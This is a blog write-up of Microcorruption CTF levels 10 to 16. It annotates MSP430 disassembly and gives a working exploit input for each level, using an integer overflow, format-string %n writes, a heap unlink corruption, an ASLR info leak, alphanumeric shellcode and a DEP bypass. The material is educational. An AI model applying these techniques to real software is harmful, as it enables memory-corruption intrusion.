---
layout: post
title: "Microcorruption CTF - Part II"
date: 2014-04-21 22:51:26 +0300
comments: true
categories: 
---

Introduction
------------
This is the second post about the [microcorruption CTF](https://microcorruption.com). For the previous post click [here](http://idosch.org/blog/2014/04/18/microcorruption-ctf-part-i/).

Level 10: Jakarta
-----------------
"Zero bottles of beer on the wall, zero bottles of beer; take one down, pass it around, 65535 bottles of beer on the wall."

This quote says it all, but I'll explain anyway. Here the HSM 1 is back so we already know what we need to do: make the notorious `login` return to `unlock_door`. However, as always, there is a catch. Both a user name and a password should be entered and their combined length needs to be no more than 31 bytes, which is of course less than the number of bytes needed to overwrite the return address. Below are snippets from `login` with my remarks.

At this stage you already entered your user name and its length is stored in `r11`. The following code subtracts your user name's length from `0x1f` (31), stores the result in `r14` and use it to read that much bytes from the user as its password using `getsn`.
```
45c8:  3e40 1f00      mov   #0x1f, r14
45cc:  0e8b           sub   r11, r14
45ce:  3ef0 ff01      and   #0x1ff, r14
45d2:  3f40 0224      mov   #0x2402, r15
45d6:  b012 b846      call  #0x46b8 <getsn>
```

After entering a password its length will be stored in `r15` with the user name length still in `r11`. Therefore, what the following code does is making sure the combined length is no more than 33 bytes, thereby, supposedly preventing us from overwriting the return address. Looking closer you may notice that the above statement is not accurate, as this is a `cmp.b` instruction that only checks the lower byte of the word and not all of it.
```
45fe:  0f5b           add   r11, r15
4600:  7f90 2100      cmp.b #0x21, r15
4604:  0628           jnc   #0x4612 <login+0xb2>
```

Knowing all this and keeping in mind the quote from the beginning, the rest should be pretty clear. We begin by entering a user name`0x20` bytes long, as this will cause `r14` to become `0xffff` (-1) in `0x45cc`, thereby allowing us to enter a password of up to `0x1ff` bytes.

```
$ python2 -c "print '41'*32" | xclip -i
```
Assuming the above user name was entered, the stack should look like this before a password is entered:

```
3fe0:   0000 0000 7846 0300 ec46 0000 0a00 2000   ....xF...F.... .
3ff0:   c845 4141 4141 4141 4141 4141 4141 4141   .EAAAAAAAAAAAAAA
4000:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
4010:   4141 0000 0000 4044 0000 0000 0000 0000   AA....@D........
```

with the return address (`0x4440`) at `0x4016`. Keeping in mind that we already entered `0x20` bytes and that the lower byte of the combined length needs to be less than `0x22`, we need a password of length `0xe0` as the combined length will be `0xe0+0x20=0x100`. Thus, the following password is used:
```
$ python2 -c "print '41'*4 + '4c44' + '41'*218" | xclip -i
```

Where the first four bytes simply fill the space between the end of the user name and the start of the return address and the next two bytes are the address of `unlock_door` (`0x444c`).

Level 11: Addis Ababa
---------------------
The first thing to notice is the use of the `printf` subroutine as opposed to previous levels. Therefore, it is pretty obvious it needs to be examined.

The LockIT Pro manual lists the following `printf` conversion specifiers: `s`, `x`, `c` and `n`. The most interesting is the last, as it "saves the number of characters printed thus far". Thus, it is possible to use this option in order to write data into memory and potentially change the order of execution.

If only one `n` specifier is used, then the character count up to `%` is copied to memory location `0x0`. However, if another specifier is used, then the function assumes the address to write to is given by the first two bytes of the format string. Hence, it is possible to write small values (byte count) to arbitrary memory locations, such as the memory location where the return address of the `printf` subroutine is stored (`0x402e`). This bug is usually the result of human error where the programmer mistakenly wrote `printf(str_buf)` instead of `printf("%s", str_buf)`. Of course using the `n` specifier is not the only way to exploit this, but there is a whole class of such exploits, called [format string vulnerability](http://en.wikipedia.org/wiki/Uncontrolled_format_string).

Since we can only write small values it is not possible to change the return address to anything useful (the `unlock_door` routine is at `0x44da`). However, in this level the HSM 1 is used, which writes a non-zero value to a specific memory location (`0x4032` in this case) if the user's password is correct. Owing to the fact that the `printf` subroutine is called after the password is checked, we can write a non-zero value (our byte count) to `0x4032`, thereby unlocking the door. This is accomplished by using the following input: `0x3240256e256e`.

Conclusion: never write `printf(buffer)`.

Level 12: Novosibirsk
---------------------
This is very similar to the previous level (Addis Ababa). The only difference is that the HSM 2 is used instead of the HSM 1. Therefore, we use the same format string exploit, but instead of changing the memory location where the HSM 1 writes to, we simply change the value passed to the HSM 2 from `0x7e` (unlock if password is correct) to `0x7f` (unlock).

```
$ python2 -c "print 'c844' + '41'*127 + '256e'" | xclip -i
```

Level 13: Algiers
-----------------
This is probably my favorite level. In this level we enter a username and a password which are stored in the heap and not copied to the stack as in previous levels. The memory layout of the LockIT Pro is very much like that of the x86, with the heap growing towards higher memory addresses and the stack growing towards lower memory addresses.
```
Memory layout:
----------
|  heap  |    grows down
|        |  
----------
| stack  |    grows up
|        |
----------
```

Although the HSM 1 is employed in this level with the `unlock_door` subroutine present, it is not possible to simply overwrite the return address and jump there, as no user entered data is copied to the stack. Starting with the `login` subroutine we see the following:

Two `0x10` bytes chunks are allocated on the heap and their respective addresses stored in registers `r10` and `r11`.
```
463e:  3f40 1000      mov   #0x10, r15
4642:  b012 6444      call  #0x4464 <malloc>
4646:  0a4f           mov   r15, r10
4648:  3f40 1000      mov   #0x10, r15
464c:  b012 6444      call  #0x4464 <malloc>
4650:  0b4f           mov   r15, r11
```

Then, a username and a password with a length of up to `0x30` chars each are written into these chunks with the username in the first chunk. Notice that although the chunk size is only `0x10` bytes, `0x30`bytes are read from the user!
```
4666:  0f4a           mov   r10, r15
4668:  b012 0a47      call  #0x470a <getsn>
466c:  3f40 c845      mov   #0x45c8, r15
4670:  b012 1a47      call  #0x471a <puts>
4674:  3f40 d445      mov   #0x45d4, r15
4678:  b012 1a47      call  #0x471a <puts>
467c:  3e40 3000      mov   #0x30, r14
4680:  0f4b           mov   r11, r15
4682:  b012 0a47      call  #0x470a <getsn>
```

Next, the password is passed to `test_password_valid`, which in turn sends it to the HSM 1, and if it is valid the door is unlocked. As you have probably noticed, the username is not used at all.
```
4686:  0f4b           mov   r11, r15
4688:  b012 7045      call  #0x4570 <test_password_valid>
468c:  0f93           tst   r15
468e:  0524           jz    #0x469a <login+0x60>
4690:  b012 6445      call  #0x4564 <unlock_door>
```

Finally, both the username and the password are freed from the heap using `free`, with the password being freed first and then the username.
```
46a2:  0f4b           mov   r11, r15
46a4:  b012 0845      call  #0x4508 <free>
46a8:  0f4a           mov   r10, r15
46aa:  b012 0845      call  #0x4508 <free>
```

One obvious flaw in this program is the one already pointed out: although the username and password are allocated each only `0x10` bytes, `0x30` bytes are read from the user. Thus, corrupting the heap seems like a good way for passing this level. A useful way to understand how the heap works is to look at it before and after each `malloc` call:

Just before allocating `0x10` bytes for the username:
```
2400:   0824 0010 0100 0000 0000 0000 0000 0000   .$..............
```
Just after allocating `0x10` bytes for the username:
```
2400:   0824 0010 0000 0000 0824 1e24 2100 0000   .$.......$.$!...
2410:   0000 0000 0000 0000 0000 0000 0000 0824   ...............$
2420:   0824 c81f 0000 0000 0000 0000 0000 0000   .$..............
```
Just after allocating `0x10` bytes for the password:
```
2400:   0824 0010 0000 0000 0824 1e24 2100 0000   .$.......$.$!...
2410:   0000 0000 0000 0000 0000 0000 0000 0824   ...............$
2420:   3424 2100 0000 0000 0000 0000 0000 0000   4$!.............
2430:   0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
```
Looking at these we can see that the heap is managed using a circular doubly-linked list. Each chunk's payload is preceded by a 6 byte allocation metadata containing the addresses of the previous and next chunks and also the size and status (free or not).
```
<----           6 bytes           ---->
+----------+----------+---------------+----------------------+
| bk       | fd       | size/status   | payload              | ...
+----------+----------+---------------+----------------------+
```

Quoting [Doug Lea](http://g.oswego.edu/dl/html/malloc.html), this allows for "two bordering unused chunks to be coalesced into one large chunk" and "all chunks can be traversed starting from any known chunk in either a forward or backward direction".

The `malloc` subroutine is not very useful to us, as it only writes to the heap values which we don't have control over. However, this knowledge greatly helps in reversing the `free` subroutine, as it puts everything in context. Below is the `free` subroutine with my comments:

```
r15 stores the address of the payload to free.
4508 <free>
4508:  0b12           push  r11
450a:  3f50 faff      add   #0xfffa, r15    // subtract 0x6 to get the address of the allocation metadata.
450e:  1d4f 0400      mov   0x4(r15), r13   // r13 stores size and allocation status.
4512:  3df0 feff      and   #0xfffe, r13    // set chunk as free
4516:  8f4d 0400      mov   r13, 0x4(r15)   // and write back to memory.
451a:  2e4f           mov   @r15, r14       // r14 stores metadata address of previous chunk.
451c:  1c4e 0400      mov   0x4(r14), r12   // r12 stores size and allocation status of previous chunk.
4520:  1cb3           bit   #0x1, r12       // check if previous chunk is free.
4522:  0d20           jnz   #0x453e <free+0x36> // jump if previous chunk is not free.
```
Since the previous chunk is free, we can merge both chunks into one big free chunk. The size of the new chunk is the size of the previous chunk (stored in `r12`), plus the 6 bytes of the metadata of current chunk plus its size.
```
4524:  3c50 0600      add   #0x6, r12
4528:  0c5d           add   r13, r12
452a:  8e4c 0400      mov   r12, 0x4(r14)
452e:  9e4f 0200 0200 mov   0x2(r15), 0x2(r14)  // since the previous chunk is free, set its next pointer to the next pointer of current chunk.
4534:  1d4f 0200      mov   0x2(r15), r13       // r13 stores address of the next chunk.
4538:  8d4e 0000      mov   r14, 0x0(r13)       // set the prev pointer of the next chunk to the previous free chunk, creating one big chunk. 
453c:  2f4f           mov   @r15, r15
```
Graphically, this looks as follows:
```
<----  not in use  ---->         <- chunk to free ->
+------+------+--------+---------+-----+----+------+---------+------+
| p_bk | p_fd | p_meta | payload | bk  | fd | meta | payload | n_bk | ...
+------+------+--------+---------+-----+----+------+---------+------+

<----          not in use             ---->
+------+-----------+----------------------+------------------+---------------------------+
| p_bk | p_fd = fd | p_meta += meta + 0x6 |      payload     |   n_bk = address of p_bk  |
+------+-----------+----------------------+------------------+---------------------------+
```
If the next chunk is free (as opposed to the previous one), then a very similar process takes place (not described here). Writing the above code snippet in C it will look something like this:
```
prev = p->bk;
prev->meta += p->meta + 6;
prev->fd = p->fd;
next = p->fd;
next->bk = prev;
```
where `p` is the argument passed to `free`. Now, since our goal is the overwrite the location of the return address (`0x439a`) of the `login` subroutine with the address of the `unlock_door` subroutine (`0x4564`) we can use the following values:
```
p->bk = 0x4396;
p->fd = 0x4400;
p->status = 0x011e;
```
Keeping in mind that we can overwrite the metadata of a chunk by overflowing the payload of the one preceding it, it's easy to overwrite the metadata of the chunk storing the password by inserting a username with a length of 22 chars, such as this one:
```
$ python2 -c "print '41'*16 + '9643' + '0044' + '1e01'" | xclip -i
```
Level 14: Vladivostok
---------------------

Up until now, whenever we wanted to change the order of execution we knew in advance the address we wanted to get to (usually that of the `unlock_door` subroutine). However, in this level [ASLR](http://en.wikipedia.org/wiki/Address_space_layout_randomization) is introduced. As the name suggests, ASLR randomly arranges the address space before each execution, thereby hindering our ability to jump to a particular memory location. To understand this better lets breakdown the `main` subroutine.

First, the `rand` subroutine is called twice to generate two random values stored in `r11` and `r10`.
```
4438 <main>
4438:  b012 1c4a      call  #0x4a1c <rand>
443c:  0b4f           mov   r15, r11
443e:  3bf0 fe7f      and   #0x7ffe, r11
4442:  3b50 0060      add   #0x6000, r11
4446:  b012 1c4a      call  #0x4a1c <rand>
444a:  0a4f           mov   r15, r10
```
Next, using `memcpy` the program code it copied over to the random location pointed to by `r11`.
```
444c:  3012 0010      push  #0x1000
4450:  3012 0044      push  #0x4400 <__init_stack>
4454:  0b12           push  r11
4456:  b012 e849      call  #0x49e8 <_memcpy>
```
Leaving the stack in its original location isn't very smart, so it's setup in a new memory location using the second random value stored in 'r10':
```
445a:  3150 0600      add   #0x6, sp
445e:  0f4a           mov   r10, r15
4460:  3ff0 fe0f      and   #0xffe, r15
4464:  0e4b           mov   r11, r14
4466:  0e8f           sub   r15, r14
4468:  3e50 00ff      add   #0xff00, r14
...
4472:  014e           mov   r14, sp
```

Finally, the program calls the `aslr_main` subroutine located in its new random memory location.
```
446c:  0d4b           mov   r11, r13
446e:  3d50 5c03      add   #0x35c, r13
...
4474:  0f4b           mov   r11, r15
4476:  8d12           call  r13
```
Since the whole program is copied over to a new memory location, I wrote a little script that given the original code and the ASLR offset (stored in `r11`) outputs the code with the new addresses:

{% gist 8c3d94e69cd5cf683f5c vladivostok.py %}

Now, what the `aslr_main` subroutine does is merely call the `_aslr_main` subroutine, which is quite long. By means of dynamic analysis we see that this subroutine prompts for a username, prints it and then prompts for a password, which is passed to the HSM 2. Entering a long username does not reveal anything except for the fact that no more than 8 chars are printed. However, once we enter more than 8 chars as a password we get the following message:
```
insn address unaligned
```
Therefore, we conclude that the password is stored on the stack and that we can overwrite the return address! Further investigation reveals that username is printed using `printf` (as opposed to `puts`) and that `0x14` bytes are read from the user as a password:
```
45da:  3241           pop   sr
45dc:  3152           add   #0x8, sp
45de:  c24e 2e24      mov.b r14, &0x242e    // makes sure no more than 8 bytes are printed.
45e2:  0b12           push  r11
45e4:  8c12           call  r12     // r12 stores the address of printf.
...
4684:  3241           pop   sr
4686:  3152           add   #0x8, sp
4688:  0b41           mov   sp, r11
468a:  2b52           add   #0x4, r11
468c:  3c40 1400      mov   #0x14, r12  // read up to 0x14 bytes.
4690:  2d43           mov   #0x2, r13   // according to the LockIT manual 0x2 is the interrupt for gets.
4692:  0c12           push  r12
4694:  0b12           push  r11
4696:  0d12           push  r13
4698:  0012           push  pc
469a:  0212           push  sr
469c:  0f4d           mov   r13, r15
469e:  8f10           swpb  r15
46a0:  024f           mov   r15, sr
46a2:  32d0 0080      bis   #0x8000, sr
46a6:  b012 1000      call  #0x10
```
Since the HSM 2 is used we don't have any `unlock_door` subroutine to return to (even if there was, we don't know its address due to ASLR) and we also can't use the previously discussed format string vulnerabilities, as we don't know where the argument we want to change is stored. Thus, our only option it to write a [shellcode](http://en.wikipedia.org/wiki/Shellcode) to the stack, that will pass the `INT` subroutine `0x7f` (trigger unlock) as an argument. However, pointing the PC to its location a problem, as we don't know where the stack is located.

Although it's not possible to use the `%n` specifier to do anything useful, we can still exploit the `printf` subroutine by passing it the `%x` specifier that will print the values found on the stack. Entering `%x%x` we get the following output (it depends on the first value produced by `rand`): 
```
0000bcdc
```
Which is the address of `printf`! Knowing the the new address of `printf` and the program's structure we can easily overwrite the return address with that of our shellcode (also on the stack), which will trigger an unlock.

Level 15: Lagos
---------------

Lagos is an ordinary level except for the fact the only alphanumeric characters can be used for the password. This greatly decreases the number of instructions we can use in our shellcode. Thankfully, Ryan Hitchman has already compiled a [list](https://gist.github.com/rmmh/8515577) of instructions that can be represented using only alphanumeric characters.

Looking at `login` we see that `0x200` bytes are read from the user as a password, then copied over to the stack starting at address `0x43ed` and finally the original password location (`0x2400`) is cleared using `memset`. As before, the objective is to trigger and unlock by issuing the `0x7f` interrupt.

Since the return address is stored on the stack at `0x43fe` it's possible to overwrite it using the password. Now, I'm pretty sure some people managed to use an address that will allow them to write a shorter shellcode by exploiting a bug in the emulator, but I'll use a straightforward one: `0x4430` which will take us to the beginning of the shellcode:

```
3453        add #-0x1, r4
4e44        mov.b r4, r14
7850 7272   add.b #0x7272, r8
3850 7a43   add #0x437a, r8
3048        mov @r8+, pc
```

The last instruction jumps to the second instruction of `INT` with an interrupt `0xff` (it's equivalent to `0x7f` - look at the code) stored in `r14`, thereby allowing us to unlock the door. As you've probably noticed all the instructions are represented using only alphanumeric characters (`0x30-0x39, 0x41-0x5a, 0x61-0x7a`).

Level 16: Bangalore
-------------------

This level introduces [DEP](http://en.wikipedia.org/wiki/Data_Execution_Prevention), in which some of the memory pages (`0x100` bytes segments in our case) are executable and some are writable, but not both. Thus, writing a shellcode to the stack is OK, but it's no executable.

Since the stack is on the boundary between pages `0x3f` and `0x40` it's possible to write our shellcode into `0x40` while it's still writable, but in a way that when `login` returns it will mark it as executable. The shellcode is very similar to the previous ones, so I'll just write the password here: `0x61616161616161616161616161616161be44000000000000400000000c4031800f00324000ffb0121000`
